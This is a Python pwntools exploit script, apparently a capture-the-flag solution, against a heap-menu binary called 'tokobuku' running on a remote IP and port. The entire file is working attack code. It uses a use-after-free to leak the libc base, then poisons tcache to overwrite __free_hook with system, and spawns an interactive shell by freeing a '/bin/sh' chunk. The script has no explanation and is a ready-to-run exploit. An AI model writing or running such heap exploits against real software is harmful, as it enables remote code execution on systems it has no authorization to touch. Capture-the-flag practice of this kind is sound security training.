#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './tokobuku'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-l", "175"]
host, port = '143.198.215.203', 20040

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return io.sendafter(delim,data)
def sla(delim,line): return io.sendlineafter(delim,line)
def sl(line): return io.sendline(line)
def rcu(d1, d2=0):
  io.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return io.recvuntil(d2,drop=True)

# =========================================================
#                         EXPLOITS
# =========================================================


def add(idx, size, data):
    sla(b':', b'1')
    sla(b':', str(idx).encode())
    sla(b':', str(size).encode())
    sa(b':', data)

def free(idx):
    sla(b':', b'2')
    sla(b':', str(idx).encode())

def view(idx):
    sla(b':', b'3')
    sla(b':', str(idx).encode())

def edit(idx, data):
    sla(b':', b'4')
    sla(b':', str(idx).encode())
    sa(b':', data)

def exploit():
    global io
    io = initialize()

    add(1, 0x420, b'bruh\n')
    add(2, 0x10, b'bruh\n')
    free(1)

    view(1)
    libc.address = u64(rcu(b': ', b'\n').ljust(0x8, b'\x00')) - 0x1ecbe0
    stdout = libc.sym['_IO_2_1_stdout_']
    stdin = libc.sym['_IO_2_1_stdin_']

    add(1, 0x420, b'bruh\n')
    add(3, 0x10, b'bruh\n')

    free(2)
    free(3)

    edit(3, p64(libc.sym['__free_hook'])+b'\n')
    add(4, 0x10, b'bruh\n')
    add(5, 0x10, p64(libc.sym['system'])+b'\n')

    add(6, 0x10, b'/bin/sh\x00\n')
    free(6)

    log.info('libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
